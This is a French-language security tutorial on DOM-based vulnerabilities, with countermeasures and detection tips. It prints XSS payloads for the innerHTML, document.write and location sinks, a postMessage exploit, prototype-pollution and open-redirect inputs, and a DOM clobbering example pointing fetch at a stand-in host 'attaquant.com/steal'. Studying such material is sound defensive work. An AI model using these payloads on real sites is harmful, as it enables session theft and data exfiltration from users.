---
title: DOM-based Vulnerabilities
domain: sciences-appliquées
subdomain: informatique / sécurité / web
tags: [dom, xss, dom-clobbering, javascript, client-side, sécurité, web]
date: 2026-03-22
---

# DOM-based Vulnerabilities

Les vulnérabilités DOM-based se produisent entièrement côté client : les données malveillantes passent d'une **source** contrôlable à un **sink** dangereux sans jamais traverser le serveur. Elles ne sont pas détectables par les scanners côté serveur.

## Sources et Sinks

```
Sources (lecture de données contrôlables par l'attaquant) :
  document.URL / document.location
  location.href / location.hash / location.search
  document.referrer
  window.name
  postMessage data
  localStorage / sessionStorage
  WebSocket messages

Sinks dangereux (écriture de données) :
  innerHTML / outerHTML           → DOM XSS
  document.write()                → DOM XSS
  eval()                          → XSS / code injection
  setTimeout(string) / setInterval(string)  → XSS
  location.href = ...             → Open Redirect / XSS via javascript:
  element.src / element.href      → XSS via javascript:
  jQuery.html() / $.append()      → DOM XSS
  element.setAttribute('src', ...) → XSS si src d'un script
```

## DOM XSS

### Exemples classiques

```javascript
// Sink : innerHTML — lit le hash de l'URL
// Code vulnérable
document.getElementById('output').innerHTML = location.hash.substring(1);
// Payload : https://site.com/page#<img src=x onerror=alert(1)>

// Sink : document.write
document.write('<div>' + location.search.split('q=')[1] + '</div>');
// Payload : https://site.com/?q=<script>alert(1)</script>

// Sink : eval (souvent dans du code de configuration)
const config = eval('(' + location.hash.substring(1) + ')');
// Payload : #{"__proto__": {"polluted": true}}

// Sink : location.href
const redirect = new URLSearchParams(location.search).get('next');
location.href = redirect;
// Payload : ?next=javascript:alert(1)

// Via jQuery
const input = location.hash.substring(1);
$('#container').html(input);  // Même vulnérabilité qu'innerHTML
$('a').attr('href', input);   // Vulnérable si javascript: est accepté
```

### DOM XSS via postMessage

```javascript
// Code vulnérable — accepte des messages de n'importe quelle origine
window.addEventListener('message', (event) => {
    // event.origin pas vérifié !
    document.getElementById('output').innerHTML = event.data;
});

// Exploit — depuis une page malveillante
// <iframe src="https://target.com"> doit être embarquable
const iframe = document.querySelector('iframe');
iframe.onload = () => {
    iframe.contentWindow.postMessage('<img src=x onerror=alert(1)>', '*');
};
```

```javascript
// Protection
window.addEventListener('message', (event) => {
    if (event.origin !== 'https://trusted.com') return;  // Vérifier l'origine
    // Traiter event.data de manière sûre (textContent, pas innerHTML)
    document.getElementById('output').textContent = event.data;
});
```

### DOM XSS via WebSocket

```javascript
// Si les messages WebSocket sont injectés dans le DOM sans sanitisation
ws.onmessage = (event) => {
    const data = JSON.parse(event.data);
    document.getElementById('chat').innerHTML += data.message;  // ← Dangereux
};
// Un attaquant envoyant un message avec <script>... → XSS stocké pour tous les clients
```

## DOM Clobbering

Technique qui exploite la possibilité de contrôler des variables globales JavaScript via des éléments HTML ayant des `id` ou `name` spécifiques.

### Principe

```html
<!-- En HTML, les éléments avec un id sont accessibles comme variables globales -->
<img id="foo">
<script>
    console.log(window.foo);  // → <img id="foo">
</script>

<!-- Clobbering : écraser une variable JavaScript avec un élément HTML -->
<!-- Si le code JS lit window.config et que l'attaquant peut injecter du HTML : -->
<a id="config"></a>
<script>
    const url = window.config.url;  // Erreur → TypeError: Cannot read property 'url' of undefined
    // ou window.config vaut maintenant l'élément <a>
</script>
```

### Exploitation

```html
<!-- Le code cible -->
<script>
    // Lit config depuis window, construit une URL
    const apiUrl = window.config ? window.config.apiBase : '/api';
    fetch(apiUrl + '/data');
</script>

<!-- Clobbering avec un élément anchor -->
<!-- L'attribut href d'un <a> est accessible via .apiBase si structure imbriquée -->
<a id="config" name="apiBase" href="https://attaquant.com/steal?data="></a>

<!-- Clobbering d'objet imbriqué via HTMLCollection -->
<!-- Deux éléments avec le même id créent une HTMLCollection -->
<a id="config"></a>
<a id="config" name="apiBase" href="https://attaquant.com/"></a>
<!-- window.config → HTMLCollection
     window.config.apiBase → <a name="apiBase"> → .href = "https://attaquant.com/" -->
```

### Cas réel — Prototype Pollution + DOM Clobbering

```html
<!-- Si la bibliothèque utilise document.getElementById('config')
     pour charger la configuration JS -->
<form id="__proto__">
  <input name="isAdmin" value="true">
</form>
<!-- Certaines bibliothèques lisent cela et polluent Object.prototype -->
```

## Prototype Pollution DOM-based

```javascript
// Code vulnérable — merge récursif avec des données de l'URL
function merge(target, source) {
    for (let key of Object.keys(source)) {
        if (typeof source[key] === 'object') {
            target[key] = target[key] || {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}

// Si l'URL est : ?__proto__[isAdmin]=true
const params = Object.fromEntries(new URLSearchParams(location.search));
merge({}, params);
// → Object.prototype.isAdmin === "true" pour tous les objets de la page
```

## Open Redirect DOM-based

```javascript
// Lecture du paramètre next et redirection
const next = new URLSearchParams(location.search).get('next');
window.location = next;  // Pas de validation

// Payloads
// ?next=https://attaquant.com          → redirection externe
// ?next=javascript:alert(1)           → XSS
// ?next=//attaquant.com               → redirection relative → externe
```

## Détection

```bash
# Outils de scan DOM XSS
# DOMinator Pro (commercial)
# DOM Invader (extension Burp Suite) — le plus accessible

# DOM Invader (Burp) :
# 1. Ouvrir le navigateur intégré Burp
# 2. Extension DOM Invader → "Enable"
# 3. Naviguer sur le site
# 4. DOM Invader insère des canaries dans les sources et détecte si elles atteignent des sinks

# Audit manuel — rechercher les sinks dans le code JS
grep -r "innerHTML\|outerHTML\|document\.write\|eval(" *.js
grep -r "location\.hash\|location\.search\|location\.href" *.js

# Dans la console du navigateur
# Chercher les variables contrôlables par l'URL
Object.keys(window).filter(k => k.includes('url') || k.includes('path'))
```

## Contre-mesures

```javascript
// Utiliser textContent au lieu d'innerHTML (ne parse pas le HTML)
element.textContent = userInput;   // Sûr
element.innerHTML = userInput;     // Dangereux

// Sanitiser avant injection HTML
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

// Valider les redirections
const ALLOWED_ORIGINS = ['https://site.com'];
const next = new URLSearchParams(location.search).get('next');
try {
    const url = new URL(next, window.location.origin);
    if (ALLOWED_ORIGINS.includes(url.origin)) {
        window.location = url.href;
    }
} catch (e) {
    // URL invalide → ignorer
}

// CSP stricte pour limiter les sinks
// Content-Security-Policy: script-src 'nonce-RANDOM' 'strict-dynamic'
// Empêche les scripts inline (eval, innerHTML avec scripts)

// Éviter d'utiliser window.name — modifiable par une page ouvrant la fenêtre
// Éviter d'utiliser document.referrer sans validation
```
